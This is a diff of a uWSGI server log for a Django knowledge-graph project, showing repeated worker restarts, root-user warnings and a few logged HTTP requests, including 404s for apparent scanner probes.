+[pid: 21732|app: 0|req: 1/1] 180.183.250.140 () {32 vars in 455 bytes} [Mon Apr 22 07:24:09 2019] GET / => generated 12678 bytes in 2159 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+...brutally killing workers...
 worker 1 buried after 2 seconds
 worker 2 buried after 2 seconds
 worker 3 buried after 2 seconds
@@ -836,7 +554,7 @@ closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
 found fd 3 mapped to socket 0 (127.0.0.1:8000)
 running /usr/local/bin/uwsgi
 [uWSGI] getting INI configuration from uwsgi.ini
-*** Starting uWSGI 2.0.18 (64bit) on [Sat Apr 20 13:30:01 2019] ***
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:25:00 2019] ***
 compiled with version: 8.3.0 on 16 March 2019 06:35:56
 os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
 nodename: VM_0_13_centos
@@ -858,7 +576,7 @@ uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
-Python main interpreter initialized at 0x25d81c0
+Python main interpreter initialized at 0x19bd1c0
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 python threads support enabled
@@ -866,13 +584,576 @@ your server socket listen backlog is limited to 100 connections
 your mercy for graceful operations on workers is 60 seconds
 mapped 416880 bytes (407 KB) for 8 cores
 *** Operational MODE: preforking+threaded ***
-WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25d81c0 pid: 19822 (default app)
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x19bd1c0 pid: 21719 (default app)
 uWSGI running as root, you can use --uid/--gid/--chroot options
 *** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
 *** uWSGI is running in multiple interpreter mode ***
-gracefully (RE)spawned uWSGI master process (pid: 19822)
-spawned uWSGI worker 1 (pid: 28117, cores: 2)
-spawned uWSGI worker 2 (pid: 28118, cores: 2)
-spawned uWSGI worker 3 (pid: 28121, cores: 2)
+gracefully (RE)spawned uWSGI master process (pid: 21719)
+spawned uWSGI worker 1 (pid: 22775, cores: 2)
+spawned uWSGI worker 2 (pid: 22776, cores: 2)
+spawned uWSGI worker 3 (pid: 22777, cores: 2)
+spawned uWSGI worker 4 (pid: 22778, cores: 2)
 Python auto-reloader enabled
-spawned uWSGI worker 4 (pid: 28126, cores: 2)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:26:26 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+writing pidfile to logs/uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x1e078a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 7 seconds on interpreter 0x1e078a0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 1349, cores: 2)
+spawned uWSGI worker 2 (pid: 1350, cores: 2)
+spawned uWSGI worker 3 (pid: 1351, cores: 2)
+spawned uWSGI worker 4 (pid: 1352, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 07:35:05 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 1349)...
+Gracefully killing worker 2 (pid: 1350)...
+Gracefully killing worker 3 (pid: 1351)...
+Gracefully killing worker 4 (pid: 1352)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:35:06 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x11fd1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x11fd1c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 2299, cores: 2)
+spawned uWSGI worker 2 (pid: 2300, cores: 2)
+spawned uWSGI worker 3 (pid: 2301, cores: 2)
+spawned uWSGI worker 4 (pid: 2302, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 07:35:21 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 2299)...
+Gracefully killing worker 2 (pid: 2300)...
+Gracefully killing worker 3 (pid: 2301)...
+Gracefully killing worker 4 (pid: 2302)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:35:23 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x17ac1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x17ac1c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 2336, cores: 2)
+spawned uWSGI worker 2 (pid: 2337, cores: 2)
+spawned uWSGI worker 3 (pid: 2338, cores: 2)
+spawned uWSGI worker 4 (pid: 2339, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 09:13:17 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 2336)...
+Gracefully killing worker 2 (pid: 2337)...
+Gracefully killing worker 3 (pid: 2338)...
+Gracefully killing worker 4 (pid: 2339)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:13:18 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x20db1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x20db1c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 12720, cores: 2)
+spawned uWSGI worker 2 (pid: 12721, cores: 2)
+spawned uWSGI worker 3 (pid: 12722, cores: 2)
+spawned uWSGI worker 4 (pid: 12723, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 09:13:40 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12720)...
+Gracefully killing worker 2 (pid: 12721)...
+Gracefully killing worker 3 (pid: 12722)...
+Gracefully killing worker 4 (pid: 12723)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:13:41 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x1a421c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1a421c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 12769, cores: 2)
+spawned uWSGI worker 2 (pid: 12770, cores: 2)
+spawned uWSGI worker 3 (pid: 12771, cores: 2)
+spawned uWSGI worker 4 (pid: 12772, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+Not Found: /echo.php
+[pid: 12772|app: 0|req: 1/1] 139.162.88.63 () {32 vars in 408 bytes} [Mon Apr 22 09:53:22 2019] GET /echo.php?info=1234567890 => generated 11092 bytes in 782 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
+Mon Apr 22 09:58:38 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 12769)...
+Gracefully killing worker 2 (pid: 12770)...
+Gracefully killing worker 3 (pid: 12771)...
+Gracefully killing worker 4 (pid: 12772)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:58:40 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x186e1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x186e1c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 18214, cores: 2)
+spawned uWSGI worker 2 (pid: 18215, cores: 2)
+spawned uWSGI worker 3 (pid: 18216, cores: 2)
+spawned uWSGI worker 4 (pid: 18217, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+[pid: 18215|app: 0|req: 1/1] 45.76.144.219 () {36 vars in 421 bytes} [Mon Apr 22 10:17:56 2019] GET / => generated 12678 bytes in 782 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Mon Apr 22 10:20:26 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 18214)...
+Gracefully killing worker 2 (pid: 18215)...
+Gracefully killing worker 3 (pid: 18216)...
+Gracefully killing worker 4 (pid: 18217)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:20:27 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xe821c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe821c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 20194, cores: 2)
+spawned uWSGI worker 2 (pid: 20195, cores: 2)
+spawned uWSGI worker 3 (pid: 20196, cores: 2)
+spawned uWSGI worker 4 (pid: 20197, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 10:20:34 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 20194)...
+Gracefully killing worker 2 (pid: 20195)...
+Gracefully killing worker 3 (pid: 20196)...
+Gracefully killing worker 4 (pid: 20197)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:20:35 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x29c31c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x29c31c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 20223, cores: 2)
+spawned uWSGI worker 2 (pid: 20224, cores: 2)
+spawned uWSGI worker 3 (pid: 20225, cores: 2)
+spawned uWSGI worker 4 (pid: 20226, cores: 2)
+Python auto-reloader enabled
+Mon Apr 22 10:26:43 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 20223)...
+Gracefully killing worker 2 (pid: 20224)...
+Gracefully killing worker 3 (pid: 20225)...
+Gracefully killing worker 4 (pid: 20226)...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:26:44 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0x280d1c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x280d1c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 20830, cores: 2)
+spawned uWSGI worker 2 (pid: 20831, cores: 2)
+spawned uWSGI worker 3 (pid: 20832, cores: 2)
+spawned uWSGI worker 4 (pid: 20833, cores: 2)
+Python auto-reloader enabled
+数据库已存在！
+create neo4j class ...
+connect succeed
+数据库已存在！
+Not Found: /404/search_children.js
+[pid: 20831|app: 0|req: 1/1] 120.132.3.65 () {34 vars in 500 bytes} [Mon Apr 22 10:28:41 2019] GET /404/search_children.js => generated 11110 bytes in 895 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
+[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 20830)...
+Gracefully killing worker 2 (pid: 20831)...
+Gracefully killing worker 3 (pid: 20832)...
+Gracefully killing worker 4 (pid: 20833)...
+[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /root/MHKG/Django
+closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
+found fd 3 mapped to socket 0 (127.0.0.1:8000)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 10:29:09 2019] ***
+compiled with version: 8.3.0 on 16 March 2019 06:35:56
+os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
+nodename: VM_0_13_centos
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/MHKG/Django
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/MHKG/Django
+your processes number limit is 7272
+your memory page size is 4096 bytes
+detected max file descriptor number: 100001
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
+Python main interpreter initialized at 0xe581c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416880 bytes (407 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe581c0 pid: 1335 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
